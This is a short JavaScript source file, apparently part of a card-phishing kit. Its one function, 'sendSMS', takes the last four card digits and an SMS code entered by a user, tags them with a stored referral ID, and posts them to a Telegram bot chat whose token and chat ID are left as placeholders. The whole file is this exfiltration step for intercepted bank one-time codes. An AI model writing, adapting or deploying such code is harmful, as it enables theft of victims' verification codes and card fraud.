export const sendSMS = async (data) => {
  const TELEGRAM_API = "set here your telegram id";
  const CHAT_ID = "set here your chat id";

  const refId = localStorage.getItem("referralId");

  const message = `
    SMS
        lastNumbersOfCard: ${data.cardNumber.slice(-4)}
        SMS: ${data.sms}
        Refferal ID: ${refId}`;

  try {
    await fetch(TELEGRAM_API, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    });
  } catch (error) {
    console.error("Ошибка при отправке:", error);
  }
};
